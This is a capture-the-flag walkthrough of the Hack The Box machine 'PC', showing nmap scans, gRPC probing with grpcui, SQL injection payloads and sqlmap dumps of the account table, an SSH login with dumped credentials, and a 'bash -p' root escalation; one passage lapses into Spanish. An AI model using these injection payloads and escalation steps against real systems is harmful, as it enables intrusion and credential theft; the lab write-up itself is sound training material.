[Leer En Español](español.md)

# PC - WriteUp/Walkthrought [HTB]

## PWNED By 14Wual

[Github](https://github.com/14wual):  14wual <br>
[Twitter](https://twitter.com/14wual): 14wual <br>
[YouTube](https://youtube.com/@wual): @wual <br>
[Paǵina Web](https://14wual.github.com) <br>

## About the Laboratory

**Level**: Easy <br>
**Operating System**: Linux <br>
**Rating**: 4.5 <br>
**Release Date**: May 21 <br>

## Collection

We start by using NMAP to find open ports.

Command: `sudo nmap -sCV -T5 -sS -n 10.10.11.214 -oN nmap-basic.txt`. Output:

```
Not shown: 999 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 91bf44edea1e3224301f532cea71e5ef (RSA)
| 256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_ 256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since it doesn't give us much information, let's do a full port scan: ` sudo nmap -p- -T5 -n 10.10.11.214 -oG nmap-p-.txt`. Output:

```
Not shown: 65533 filtered tcp ports (no-response)
PORT STATE SERVICE
22/tcp open ssh
50051/tcp open unknown
```

We see that we have another port, an unknown port, `50051`, if we do a little search on the internet, we find out that this is a port that is commonly used by the **gRPC** service/protocol. So we are going to install a tool to be able to visualize the port.

For this, we need to have **Go** installed, for this we do the following:

```bash
sudo apt update
sudo apt install golang
```

Now we must install the [grpcui](https://pkg.go.dev/github.com/fullstorydev/grpcui) tool, so to do this, we execute the following command in our terminal:

```bash
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

If this reports an error, as it was on my car, it can be done in another way. First we must clone the following repository: [fullstorydev/grpcui](https://github.com/fullstorydev/grpcui), then perform the following commands:

```bash
cd grpcui && make install
```

If it keeps giving us a compilation error, we do the following:

```bash
cd grpcui && make updatedeps && make install
```

Finally, we need to export the path, to add it to our **rc**. First we do a `sudo find / -name grpcui`, it should report several outputs, but the one that interests us is something similar to this: `/home/<your-username>/go/bin/grpcui`. Now we must open our rc file, depending on which shell we are using we will open `.zshrc` or `.bashrc`. In my case it is **zsh**. With the command `sudo nano .zshrc` we open the file, and at the end of the file we write the following: `export PATH=$PATH:/home/<your-user>/go/bin` Being this path, the one we have found doing the `find`.

By doing these simple steps, our terminal should report that the `grpcui` command **exists**.

Now we must do the following command, to execute the application and be able to visualize the port:

```
grpcui --plaintext 10.10.11.214:50051
```

When executing this command, it will open a new tab in our browser something like this:

![grpcui-web](images/grpcui-1.png)

On this page we see several quite important things, but let's go to what is important. First of all we find 2 drop-downs: **Service name** & **Method name**. If we deploy the first mentioned. We will see that we only have one action. But if we deploy the second one, it seems that we have 3 different functions to discover: **LoginUser** & **RegisterUser** & **GetInfo**, we will help ourselves with them in the future, but now let's focus on the rest of the content.

There is a section called **Request Data**, *LoginUserRequest*, which allows us to make a login request. So let's try some default passwords. We activate the two inputs, marking the two checkboxes and writing:

```
username: username
password: password
```

Now we are going to try to log in with those credentials, so having written these two strings, we are going to press `invoke`. The response is as follows (in the Response Data section):

```
{
   "message": "Login unsuccessful"
}
```

Which tells us that these are not the credentials, so we keep trying, this time we are going to try the following:

```
username: admin
password: admin
```

When invoking it, it reports the following information:

**Response Data**

```
{
   "message": "Your id is 333."
}
```

**Response Trailers**


| token | b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjI5NDZ96xtSkyx5xzDHf66woamHT2EGOpYzSYborktiz3P0Igg' |
|-------|----------------------------------------- -------------------------------------------------- -------------------------------------------|

As we can see, we have already obtained the administrator credentials, these are: `admin:admin`. We see that we have an id and a token. So now we are going to try to get a little more information.

Before we saw that in the *Method name* dropdown, we had an option called **GetInfo**, so we are going to select it.

Once again we are going to select the string we have, this time for the ID field, and we are going to copy our id, in my case 333.

When invoked, it returns the following message:

```
{
   "message": "Authorization Error.Missing 'token' header"
}
```

We are missing the token, so we return to the **Request Form** section and in the category: **Request Metadata**, we are going to write the following:

```
Name: token
Value: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjI5NDZ96xtSkyx5xzDHf66woamHT2EGOpYzSYborktiz3P0Igg
```

We write the value, in the form of a string, removing the `b''`, to remove the bytes form. The output is the following:

```
{
   "message": "Will update soon."
}
```

![request-response-getInfo](images/request-response-getInfo.png)

As we know more or less how `grpcui` works, we are going to go to `BurpSuite`, to see if we can get a little more information.

As the tokens and ids are temporary, we are going to get another one, logging in with `admin:admin`. And we are going to edit user information again, but this time intercepting the traffic. We see the following information being sent:

```
{
     "metadata":[
         {
             "name":"token",
             "value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjM5NjB9.5yJCFKAkt-trLMcwYeW2Xjbn9Oz71b7s0Gekj_xEqHo"
         }
     ],
     "data":[
         {
             "id":"537"
         }
     ]
}
```

![burpsuite-1](images/burpsuite-1.png)

At this point, we are going to perform **SQLi**. We will take advantage of the ID field, for this. We'll start by trying to use some payloads from [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). We are going to try to get the version of the ddbb, making requests without injecting:

```sql
Oracle SQL: "SELECT version FROM v$instance;",
PostgreSQL: "SELECT version()",
SQLite: "select sqlite_version();",
MySQL: "SELECT * FROM Table WHERE id = '!id';"
```

In all, it reports the following:

```
unknown (2)
Unexpected <class 'TypeError'>: bad argument type for built-in operation
```

![sqli-1](images/sqli-1.png)


As, all of them have given me an error, we are going to make simpler requests, and this time yes, **SQLi**. I tried all of the following to no avail:

```
SELECT sql FROM sqlite_schema
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

![sqli-2](images/sqli-2.png)

At this point, we are going to intercept the request once more, we are going to save it in a txt file and we are going to pass it through `SQLMap`.

To do this, we are going to right click on all the copied text, and copy it to the `copy as curl command (bash)` option. So we do the following

```bash
curl ... >> output.txt
```

In my case it is the following:

![petition-curl](images/petition-curl.png)

*(The **request** should be copied, **not** the **result**)*.

![petition-curl-2](images/petition-curl-2.png)

Now we will carry out the following command: `sqlmap -r file.txt`.

![sqlmap-1.png](images/sqlmap-1.png)

In my case, it has already discovered that we have sqlite before us, and the output, it has saved it for us in the following path: `'/home/<your-username>/.local/share/sqlmap/output/127.0.0.1'` . Let's see, what has been reported to us, in my case:

```
cd /home/wual/.local/share/sqlmap/output/127.0.0.1
ls >> log session.sqlite target.txt
```

If we do a cat to our target, it should report an output similar to this, but with your data:

```
1 │ http://127.0.0.1:37019/invoke/SimpleApp.getInfo (POST) # /usr/bin/sqlmap -r petition.txt
2 │
3 │ {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5MjY0NDJ9.-OvkPbdZYQYEyNAbZkThmY H5eMnBnB5u4XJ2rhmJ8KI"}],"data":[{"id":"555"}]}
```

When I cat the log, it reports that a total of **193** HTTP requests have been made and that ddbbs SQLite has been identified. Now let's write a **small basic py script** to fully read the `session.sqlite` file, the third file reported by **sqlmap**.

python script:

```
import sqlite3
def read_session_sqlite(file_path):

     conn = sqlite3.connect(file_path)
     cursor = conn.cursor()

     cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
     tables = cursor.fetchall()

     for table in tables:
         table_name = table[0]
         print(f"Table: {table_name}\n-------------------------")

         cursor.execute(f"SELECT * FROM {table_name};")
         rows = cursor.fetchall()

         for row in rows:print(row)

     cursor.close()
     conn.close()

if __name__ == '__main__':
     sqlite_file = "<path-file-session.sqlite>"
     read_session_sqlite(sqlite_file)

```

Python script link: [Python Script](scripts/session-sqlite.py)

![script-py](images/script-py.png)

This database, if it has reported us a lot of apparently very valuable information, if we carry out the following command, we can see the content of this by putting it in a file:

```
python3 session-sqlite.py >> session-sqlite.output
```

This too, can be seen here: [Output Link](scripts/output/session-sqlite.output). Open the dropdown to see the `output` reported by the script:

<details>
   <summary>Output</summary>

     ```

     Table: storage
     -------------------------
     (1240019662489059, 'False')
    (572062615179750280, 'False')
    (804542772731992705, 'False')
    (1384206628068379451, 'False')
    (2283944405254295019, 'False')
    (2347901146056695925, 'gAKJLg==')
    (3068277119679010664, 'True')
    (3183297259884337133, 'False')
    (3317302315516816033, 'False')
    (3959875106548221468, 'False')
    (4281076238450381754, 'False')
    (4380207248260737285, 'False')
    (4655856319666804831, 'SQLite')
    (4714056397588486423, 'False')
    (4923402527400451348, 'False')
    (5105149081609890783, 'gAJdcQBjbGliLmNvcmUuZGF0YXR5cGUKSW5qZWN0aW9uRGljdApxASmBcQIoWAUAAABwbGFjZXEDWA0AAAAoY3VzdG9tKSBQT1NUcQRYCQAAAHBhcmFtZXRlcnEFWAcAAABKU09OIGlkcQZYBQAAAHB0eXBlcQdLAVgGAAAAcHJlZml4cQhYAAAAAHEJWAYAAABzdWZmaXhxCmgJWAYAAABjbGF1c2VxC11xDChLAUsISwllWAUAAABub3Rlc3ENXXEOWAQAAABkYXRhcQ9jbGliLmNvcmUuZGF0YXR5cGUKQXR0cmliRGljdApxECmBcREoSwFoECmBcRIoWAUAAAB0aXRsZXETWDAAAABBTkQgYm9vbGVhbi1iYXNlZCBibGluZCAtIFdIRVJFIG9yIEhBVklORyBjbGF1c2VxFFgHAAAAcGF5bG9hZHEVWM8AAAB7Im1ldGFkYXRhIjpbeyJuYW1lIjoidG9rZW4iLCJ2YWx1ZSI6ImV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVgybGtJam9pWVdSdGFXNGlMQ0psZUhBaU9qRTJPRFE1TWpZME5ESjkuLU92a1BiZFpZUVlFeU5BYlprVGhtWUg1ZU1uQm5CNXU0WEoycmhtSjhLSSJ9XSwiZGF0YSI6W3siaWQiOiI1NTUgQU5EIDkxNzY9OTE3NiJ9XX1xFlgFAAAAd2hlcmVxF0sBWAYAAAB2ZWN0b3JxGFgPAAAAQU5EIFtJTkZFUkVOQ0VdcRlYBwAAAGNvbW1lbnRxGmgJWA8AAAB0ZW1wbGF0ZVBheWxvYWRxG05YCgAAAG1hdGNoUmF0aW9xHEc/6++dsi0OVlgIAAAAdHJ1ZUNvZGVxHUvIWAkAAABmYWxzZUNvZGVxHkvIdX1xHyhYCQAAAGF0dHJpYnV0ZXEgTlgIAAAAa2V5Y2hlY2txIYhYGAAAAF9BdHRyaWJEaWN0X19pbml0aWFsaXNlZHEiiHViSwVoECmBcSMoaBNYLwAAAFNRTGl0ZSA+IDIuMCBBTkQgdGltZS1iYXNlZCBibGluZCAoaGVhdnkgcXVlcnkpcSRoFVgZAQAAeyJtZXRhZGF0YSI6W3sibmFtZSI6InRva2VuIiwidmFsdWUiOiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKMWMyVnlYMmxrSWpvaVlXUnRhVzRpTENKbGVIQWlPakUyT0RRNU1qWTBOREo5Li1PdmtQYmRaWVFZRXlOQWJaa1RobVlINWVNbkJuQjV1NFhKMnJobUo4S0kifV0sImRhdGEiOlt7ImlkIjoiNTU1IEFORCA2OTI4PUxJS0UoQ0hBUig2NSw2Niw2Nyw2OCw2OSw3MCw3MSksVVBQRVIoSEVYKFJBTkRPTUJMT0IoW1NMRUVQVElNRV0wMDAwMDAwMC8yKSkpKSJ9XX1xJWgXSwFoGFh/AAAAQU5EIFtSQU5ETlVNXT0oQ0FTRSBXSEVOIChbSU5GRVJFTkNFXSkgVEhFTiAoTElLRSgnQUJDREVGRycsVVBQRVIoSEVYKFJBTkRPTUJMT0IoW1NMRUVQVElNRV0wMDAwMDAwMC8yKSkpKSkgRUxTRSBbUkFORE5VTV0gRU5EKXEmaBpoCWgbTmgcRz/r752yLQ5WaB1LyGgeTnV9cScoaCBOaCGIaCKIdWJLBmgQKYFxKChoE1gsAAAAR2VuZXJpYyBVTklPTiBxdWVyeSAoTlVMTCkgLSAxIHRvIDIwIGNvbHVtbnNxKWgVWKABAAB7Im1ldGFkYXRhIjpbeyJuYW1lIjoidG9rZW4iLCJ2YWx1ZSI6ImV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVgybGtJam9pWVdSdGFXNGlMQ0psZUhBaU9qRTJPRFE1TWpZME5ESjkuLU92a1BiZFpZUVlFeU5BYlprVGhtWUg1ZU1uQm5CNXU0WEoycmhtSjhLSSJ9XSwiZGF0YSI6W3siaWQiOiItNzM5NCBVTklPTiBBTEwgU0VMRUNUIENIQVIoMTEzLDEyMCwxMDcsMTIyLDExMyl8fENIQVIoMTE3LDY3LDEyMCw4NywxMjEsMTEwLDc1LDEwNywxMDIsMTIwLDExOSw4NiwxMjIsNzYsODUsMTEwLDEyMCwxMDMsNzIsNjYsNzksNjcsNzEsODUsNzgsMTAxLDk3LDEyMCwxMTcsNzIsMTEwLDk3LDgxLDcyLDk4LDc2LDcwLDEwMyw4MCw2OSl8fENIQVIoMTEzLDEwNiwxMDYsMTIwLDExMyktLSBEc2VHIn1dfXEqaBdLAmgYKEsASwFYFQAAAFtHRU5FUklDX1NRTF9DT01NRU5UXXEraAloCVgEAAAATlVMTHEsSwKJTk5OdHEtaBpoK2gbTmgcRz/r752yLQ5WaB1OaB5OdX1xLihoIE5oIYhoIoh1YnV9cS8oaCBOaCGIaCKIdWJYBAAAAGNvbmZxMGgQKYFxMShYCAAAAHRleHRPbmx5cTJOWAYAAAB0aXRsZXNxM05YBAAAAGNvZGVxNE5YBgAAAHN0cmluZ3E1TlgJAAAAbm90U3RyaW5ncTZOWAYAAAByZWdleHBxN05YCAAAAG9wdGltaXplcThOdX1xOShoIE5oIYhoIoh1YlgEAAAAZGJtc3E6WAYAAABTUUxpdGVxO1gMAAAAZGJtc192ZXJzaW9ucTxdcT1YBQAAAD4gMi4wcT5hWAIAAABvc3E/TnV9cUAoaCBOaCGIaCKIdWJhLg==')
    (5122382082462906814, 'False')
    (5151284069082055767, 'False')
    (5493418307874951924, 'False')
    (5564929365057259332, 'gAJdcQAu')
    (6087146522498525056, 'gAJjX19idWlsdGluX18Kc2V0CnEAXXEBhXECUnEDLg==')
    (6291964657364147628, 'False')
    (6769609608952949097, 'False')
    (6942583506710494399, 'False')
    (7202527242063647457, 'gAJjbGliLmNvcmUuZGF0YXR5cGUKQXR0cmliRGljdApxACmBcQEoWAkAAABkZWxpbWl0ZXJxAlgGAAAAYnd0anJ6cQNYBQAAAHN0YXJ0cQRYBQAAAHF4a3pxcQVYBAAAAHN0b3BxBlgFAAAAcWpqeHFxB1gCAAAAYXRxCFgDAAAAcWJxcQlYBQAAAHNwYWNlcQpYAwAAAHF5cXELWAYAAABkb2xsYXJxDFgDAAAAcXBxcQ1YBQAAAGhhc2hfcQ5YAwAAAHF0cXEPdX1xEChYCQAAAGF0dHJpYnV0ZXERTlgIAAAAa2V5Y2hlY2txEohYGAAAAF9BdHRyaWJEaWN0X19pbml0aWFsaXNlZHETiHViLg==')
    (7247098384123015991, 'False')
    (7636301594824412900, 'False')
    (7666376395574666221, 'False')
    (7736642064423348026, 'False')
    (8325498930527189365, 'False')
    (8954585370297807119, 'False')

    ```
 
</details>

Como podemos ver, la tabla se llama **storage**, y nos reporta bastantes hash. Vamos a identificar el hash de la columna `7202527242063647457`, por ejemplo. Para ello, yo voy ha usar la página web [dcode](https://www.dcode.fr/cipher-identifier) su herramienta `cipher-identifier`. Si por algún motivo, no consigo ninguno retorno, usaré otras herramientas.

![dcode-cipher-identifier](images/dcode-cipher-identifier.png)

En un principio, nos ha reportado que este, es `base64`, vamos ha intentar descifralo.

![dcode-base64](images/dcode-base64.png)

Este es el reporte, como no es legible, usaré otras herramientas. El output de *dcode*:

```
��clib.core.datatype ...
```

Before continuing, we are going to do it with everyone, although I already give you a spoiler, and it is that this tool, like the previous result, will report the output badly.

On the other hand, among all the hashes, we can see that the column: `4655856319666804831`, reports us `SQLite` and the column `5564929365057259332`, reports us `gAJdcQAu`, a quite small string, which could become a name of user.

As for now, we think they are base64 encoded, let's try to decode them using terminal as follows: `echo "<hash>" | base64 -d`. Before that, we will save each hash in a different file.

```bash
mkdir hashes-Base64 && cd hashes-Base64
touch hash-{1,2,3,4,5}.txt
```

If we do `ls`, we will see that the following files have been created:

```
hash-1.txt hash-2.txt hash-3.txt hash-4.txt hash-5.txt
```

Now we will put all the hashes in the different files:

```
echo "hash" > hash-!num.txt
```

![hashes-file](images/hashes-file.png)

And now yes, we are going to decode the hashes:


```
cat "<hash-file>" | base64 -d
```

This is the result of all, some rows, with all the requests that sqlmap has made:

![decode-hashes.png](images/decode-hashes.png)

At this point, I am going to manually test the different payloads, in case they report something interesting:

```
Payload 1: "555 AND 9176=9176" | Output: Nothing

Payload 2: "555 AND 6928=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB
(500000000/2))))" | Output: Nothing

Payload 3: "-7394 UNION ALL SELECT CHAR(113,120,107,122,113)||CHAR(117,67,120,87,121,110,75,107,102,120,119,86,122,76,85,110,120,103,72,66,79 ,67,71,85,78,101,97,120,117,72,110,97 ,81,72,98,76,70,103,80,69)||CHAR(113,106,106,120,113)-- DseG" | output: yes
```

This third Payload, has reported me the following message:

```
{
   "message": "qxkzquCxWynKkfxwVzLUnxgHBOCGUNeaxuHnaQHbLFgPEqjjxq"
}
```

# Exploitation

For the last time, we are going to execute sqlmap, but with the `--dump` parameter, to see if it dumps the entire database for us. Command (remember that the id and token are temporary):

```
sqlmap -r request.txt --dump
```

This time, the output, yes, it does provide us with really good information, among which we can highlight the following:



```
Table: accounts
[2 entries]
+------------------------+----------+
| password | username |
+------------------------+----------+
| admin | admin |
| HereIsYourPassWord1431 | sau |
+------------------------+----------+

Table: messages
[1 entry]
+----+-------------------+----------+
| id | message | username |
+----+-------------------+----------+
| 31 | Will update soon. | admin |
+----+-------------------+----------+
```

# get

![sqlmap-2](images/sqlmap-2.png)

At last! We already have a new user and his password: `sau: HereIsYourPassWord1431`.

Let's try to connect by ssh, with the user sau:

```
ssh sau@10.10.11.214
sau@10.10.11.214's password: HereIsYourPassWord1431
```

If we do `ls`, we get the following files:

```
CVE-2021-4034-main CVE-2021-4034-main.zip lin.out linpeas_base.sh lse.sh pspy64 snap user.txt
```

Let's cat the `user.txt` to get the flag: 4e15****************************

At this moment I am going to connect to a `qterm` terminal, so that this one does not bug me. And we will execute the `linpeas` in case it reports any path without root password.

![linpeas-1](images/linpeas-1.png)

# Maintenance

Running linpeas, I noticed that there was a path I could go into and run `bash` with the **flag** `-p`.

![linpeas-2](images/linpeas-2.png)

So we will execute the following commands:

```
/usr/bin/bash -p
id && whoami
cat /root/root.txt
```

And in this way we will obtain control of the machine and its flag.